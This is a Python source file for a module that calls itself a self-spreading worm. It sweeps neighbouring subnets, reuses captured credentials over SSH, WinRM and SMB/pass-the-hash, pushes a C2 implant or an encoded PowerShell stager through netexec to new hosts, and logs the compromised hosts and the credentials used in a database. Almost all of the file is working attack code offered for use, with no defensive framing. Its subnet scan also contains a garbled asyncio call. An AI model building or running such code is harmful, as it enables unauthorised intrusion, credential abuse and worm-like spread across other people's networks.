"""PropagationEngine — self-spreading worm capability.

Upon achieving a foothold, the engine:
1. Scans adjacent subnets for new targets
2. Attempts credential reuse / pass-the-hash across hosts
3. Deploys C2 agent to newly compromised hosts
4. Builds a mesh topology of compromised infrastructure
5. Establishes redundant C2 pathways through the mesh
"""
import asyncio
import base64
import json
import logging
import os
import socket
import sqlite3
import struct
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional

import httpx

from orchestrator.c2.manager import get_c2

logger = logging.getLogger("propagation.engine")

PROP_DB = os.path.join(os.path.dirname(__file__), "..", "data", "propagation.db")


@dataclass
class MeshNode:
    id: str
    hostname: str
    address: str
    os: str
    arch: str
    c2_session_id: str = ""
    compromised_at: float = 0.0
    last_active: float = 0.0
    role: str = "agent"
    subnets: list = field(default_factory=list)
    tags: list = field(default_factory=list)


@dataclass
class PropagationPath:
    source: str
    target: str
    method: str
    credential: str = ""
    exploit: str = ""
    timestamp: float = 0.0
    success: bool = False


class PropagationEngine:
    def __init__(self, db_path: str = PROP_DB):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self._init_db()
        self._mesh: dict[str, MeshNode] = {}
        self._paths: list[PropagationPath] = []
        self._c2 = get_c2()
        self._http = httpx.AsyncClient(timeout=15, verify=False)

    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS mesh_nodes (
                    id TEXT PRIMARY KEY,
                    hostname TEXT NOT NULL,
                    address TEXT NOT NULL,
                    os TEXT DEFAULT '',
                    arch TEXT DEFAULT '',
                    c2_session_id TEXT DEFAULT '',
                    compromised_at REAL NOT NULL,
                    last_active REAL NOT NULL,
                    role TEXT DEFAULT 'agent',
                    subnets TEXT DEFAULT '[]',
                    tags TEXT DEFAULT '[]'
                );
                CREATE TABLE IF NOT EXISTS propagation_paths (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    source TEXT NOT NULL,
                    target TEXT NOT NULL,
                    method TEXT NOT NULL,
                    credential TEXT DEFAULT '',
                    exploit TEXT DEFAULT '',
                    timestamp REAL NOT NULL,
                    success INTEGER DEFAULT 0
                );
                CREATE TABLE IF NOT EXISTS scan_cache (
                    subnet TEXT PRIMARY KEY,
                    hosts TEXT NOT NULL,
                    scanned_at REAL NOT NULL
                );
            """)

    async def propagate_from_foothold(self, source_ip: str, session_id: str,
                                      known_creds: list[dict] = None) -> list[dict]:
        logger.info(f"  [Propagation] Starting from {source_ip} (session={session_id})")
        results = []

        subnets = self._discover_subnets(source_ip)
        logger.info(f"  [Propagation] Identified {len(subnets)} subnets")

        for subnet in subnets:
            hosts = await self._scan_subnet(subnet)
            if not hosts:
                continue

            for host in hosts:
                if host == source_ip:
                    continue
                if self._is_compromised(host):
                    continue

                outcome = await self._attempt_infection(host, known_creds or [])
                if outcome["success"]:
                    results.append(outcome)
                    self._record_path(source_ip, host, outcome.get("method", "unknown"), outcome.get("credential", ""))
                    logger.info(f"  [Propagation] {source_ip} -> {host} via {outcome.get('method', '?')}")

        return results

    def _discover_subnets(self, ip: str) -> list[str]:
        subnets = []
        try:
            parts = ip.strip().split(".")
            if len(parts) == 4:
                subnets.append(f"{parts[0]}.{parts[1]}.{parts[2]}.0/24")
                subnets.append(f"{parts[0]}.{parts[1]}.0.0/16")
        except Exception:
            pass
        return subnets

    async def _scan_subnet(self, subnet: str) -> list[str]:
        cached = self._get_cached_scan(subnet)
        if cached:
            return cached

        hosts = []
        try:
            network, prefix = subnet.split("/")
            prefix = int(prefix)
            base = struct.unpack(">I", socket.inet_aton(network))[0]
            mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
            start = (base & mask) + 1
            end = (base | ~mask) - 1

            sem = asyncio.Semaphore(50)
            async def check(ip_int):
                async with sem:
                    ip_str = socket.inet_ntoa(struct.pack(">I", ip_int))
                    try:
                        _, _, err = await asyncio.wait_for(
                            asyncio.get_event_loop().sock_connect(
                                asyncio.open_connection(ip_str, 445),
                            ),
                            timeout=2,
                        )
                        # Actually use a TCP ping via socket
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        try:
                            s.connect((ip_str, 445))
                            s.close()
                            return ip_str
                        except (socket.timeout, ConnectionRefusedError, OSError):
                            try:
                                s.connect((ip_str, 22))
                                s.close()
                                return ip_str
                            except (socket.timeout, ConnectionRefusedError, OSError):
                                try:
                                    s.connect((ip_str, 80))
                                    s.close()
                                    return ip_str
                                except (socket.timeout, ConnectionRefusedError, OSError):
                                    return None
                    except Exception:
                        pass
                    return None

            total = min(end - start + 1, 254)
            tasks = [check(start + i) for i in range(total)]
            done = await asyncio.gather(*tasks)
            hosts = [h for h in done if h]

        except Exception as e:
            logger.warning(f"  [Propagation] Subnet scan failed: {e}")

        self._cache_scan(subnet, hosts)
        return hosts

    async def _attempt_infection(self, target: str, creds: list[dict]) -> dict:
        for cred in creds:
            username = cred.get("username", "")
            password = cred.get("password", "")
            method = cred.get("method", "ssh")

            if method == "ssh":
                result = await self._deploy_via_ssh(target, username, password)
                if result:
                    return {"target": target, "success": True, "method": "ssh", "credential": f"{username}:{password}"}

            elif method == "winrm":
                result = await self._deploy_via_winrm(target, username, password)
                if result:
                    return {"target": target, "success": True, "method": "winrm", "credential": f"{username}:{password}"}

            elif method == "smb" or method == "pass_the_hash":
                result = await self._deploy_via_smb(target, username, password)
                if result:
                    return {"target": target, "success": True, "method": "smb", "credential": f"{username}:{password}"}

        return {"target": target, "success": False, "method": "none", "credential": ""}

    async def _deploy_via_ssh(self, target: str, username: str, password: str) -> bool:
        try:
            session_id = await self._c2.deploy_implant_ssh(target, username, password)
            if session_id:
                self._register_node(target, "linux", "amd64", session_id)
                return True
        except Exception as e:
            logger.debug(f"  SSH deploy failed: {e}")
        return False

    async def _deploy_via_winrm(self, target: str, username: str, password: str) -> bool:
        try:
            session_id = await self._c2.deploy_implant_winrm(target, username, password)
            if session_id:
                self._register_node(target, "windows", "amd64", session_id)
                return True
        except Exception as e:
            logger.debug(f"  WinRM deploy failed: {e}")
        return False

    async def _deploy_via_smb(self, target: str, username: str, password: str) -> bool:
        try:
            import base64
            from orchestrator.kali_tools_client import kali
            posh_stager = self._c2.get_powershell_stager()
            if not posh_stager:
                return False
            b64_cmd = base64.b64encode(posh_stager.encode()).decode()
            result = await kali.run("netexec", (
                f"smb {target} -u {username} -p '{password}' -X 'powershell -EncodedCommand {b64_cmd}'"
            ), timeout=60)
            if "error" not in result:
                self._register_node(target, "windows", "amd64", "")
                return True
        except Exception as e:
            logger.debug(f"  SMB deploy failed: {e}")
        return False

    def _register_node(self, address: str, os_type: str, arch: str, session_id: str):
        now = time.time()
        try:
            hostname, _, _ = socket.gethostbyaddr(address)
        except Exception:
            hostname = address
        node = MeshNode(
            id=str(uuid.uuid4())[:12],
            hostname=hostname,
            address=address,
            os=os_type,
            arch=arch,
            c2_session_id=session_id,
            compromised_at=now,
            last_active=now,
            subnets=self._discover_subnets(address),
        )
        self._mesh[address] = node
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """INSERT OR REPLACE INTO mesh_nodes
                   (id, hostname, address, os, arch, c2_session_id, compromised_at, last_active, role, subnets)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (node.id, node.hostname, node.address, node.os, node.arch,
                 node.c2_session_id, node.compromised_at, node.last_active,
                 node.role, json.dumps(node.subnets)),
            )

    def _record_path(self, source: str, target: str, method: str, credential: str):
        path = PropagationPath(
            source=source, target=target, method=method,
            credential=credential, timestamp=time.time(), success=True,
        )
        self._paths.append(path)
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """INSERT INTO propagation_paths (source, target, method, credential, timestamp, success)
                   VALUES (?, ?, ?, ?, ?, 1)""",
                (source, target, method, credential, path.timestamp),
            )

    def _is_compromised(self, address: str) -> bool:
        return address in self._mesh

    def _get_cached_scan(self, subnet: str) -> Optional[list[str]]:
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute(
                "SELECT hosts, scanned_at FROM scan_cache WHERE subnet = ? AND scanned_at > ?",
                (subnet, time.time() - 300),
            ).fetchone()
            return json.loads(row[0]) if row else None

    def _cache_scan(self, subnet: str, hosts: list[str]):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT OR REPLACE INTO scan_cache (subnet, hosts, scanned_at) VALUES (?, ?, ?)",
                (subnet, json.dumps(hosts), time.time()),
            )

    def get_mesh(self) -> list[MeshNode]:
        return list(self._mesh.values())

    def get_propagation_paths(self) -> list[dict]:
        with sqlite3.connect(self.db_path) as conn:
            rows = conn.execute(
                "SELECT source, target, method, credential, timestamp, success FROM propagation_paths ORDER BY timestamp DESC LIMIT 100"
            ).fetchall()
            return [
                {"source": r[0], "target": r[1], "method": r[2],
                 "credential": r[3][:20] + "..." if len(r[3]) > 20 else r[3],
                 "timestamp": r[4], "success": bool(r[5])}
                for r in rows
            ]

    def stats(self) -> dict:
        with sqlite3.connect(self.db_path) as conn:
            nodes = conn.execute("SELECT COUNT(*) FROM mesh_nodes").fetchone()[0]
            paths = conn.execute("SELECT COUNT(*) FROM propagation_paths").fetchone()[0]
            successful = conn.execute("SELECT COUNT(*) FROM propagation_paths WHERE success = 1").fetchone()[0]
            return {
                "mesh_nodes": nodes,
                "paths_total": paths,
                "paths_successful": successful,
                "active_sessions": len(self._c2.active_sessions),
            }

    async def close(self):
        await self._http.aclose()
